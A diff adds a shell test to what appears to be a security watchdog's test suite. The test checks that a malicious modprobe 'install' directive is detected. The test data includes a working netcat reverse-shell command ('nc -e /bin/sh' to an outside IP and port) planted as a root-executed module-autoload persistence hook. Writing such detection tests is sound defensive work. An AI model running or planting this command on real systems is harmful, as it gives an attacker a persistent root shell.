@@ -295,3 +295,15 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     bash "${WD}"
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in install directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANTs across the brain. Lock the netcat axis on the
+    # module-autoload-trigger root-exec persistence surface
+    # (T1547.006 — modprobe runs install directive AS ROOT when
+    # the module is auto-loaded — and modules auto-load via
+    # /dev/* access, ld.so dependencies, network packets...).
+    printf 'install evilmod /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
